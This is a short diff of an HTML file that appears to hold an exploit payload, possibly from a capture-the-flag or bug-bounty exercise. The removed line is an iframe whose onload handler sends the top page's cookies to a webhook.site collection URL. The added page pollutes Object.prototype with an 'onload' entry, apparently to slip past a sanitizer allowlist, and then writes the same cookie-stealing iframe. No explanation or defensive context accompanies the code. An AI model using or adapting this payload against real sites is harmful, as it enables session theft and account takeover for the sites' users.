@@ -1,1 +1,9 @@
-<iframe onload="try{fetch('https://webhook.site/0d808203-75d6-4a70-9ea4-130d8426cbed/log?c='+top.document.cookie)}catch(e){fetch('https://webhook.site/0d808203-75d6-4a70-9ea4-130d8426cbed/log?error='+e.message)}"></iframe>
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+  Object.prototype['*'] = ['onload'];
+  document.write('<iframe onload="try{fetch(`https://webhook.site/0d808203-75d6-4a70-9ea4-130d8426cbed/log?c=${top.document.cookie}`)}catch(e){fetch(`https://webhook.site/0d808203-75d6-4a70-9ea4-130d8426cbed/log?error=${e.message}`)}"></iframe>');
+</script>
+</body>
+</html>
